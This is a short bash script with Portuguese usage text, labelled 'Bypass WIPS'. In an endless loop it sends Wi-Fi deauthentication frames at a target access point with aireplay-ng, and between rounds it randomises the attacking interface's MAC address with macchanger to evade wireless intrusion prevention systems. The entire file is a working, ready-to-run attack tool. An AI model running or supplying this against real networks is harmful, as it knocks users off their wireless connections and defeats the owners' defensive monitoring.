#!/bin/bash

interface="$1"
ponto_acesso="$2"
channel="$3"
ESSID="$4"

if [ "$1" = "" ]
then
    echo "ELIZEUOPAIN - Bypass WIPS"
    echo "Modo de uso: $0 interface BSSID(MAC Address Alvo) Channel ESSID"
    echo "Exemplo: $0 wlan1mon FF:GG:BB:CC:AA:ZZ 6 AA:BB:CC:DD:EE:FF"
else
    while true
    do
        iwconfig "$interface" channel "$channel"
        aireplay-ng -0 1 -a "$ponto_acesso" -e "$ESSID" "$interface" | grep "deauth"
        ifconfig "$interface" down
        macchanger -r "$interface" | grep "New MAC"
        ifconfig "$interface" up
        sleep 5
    done
fi
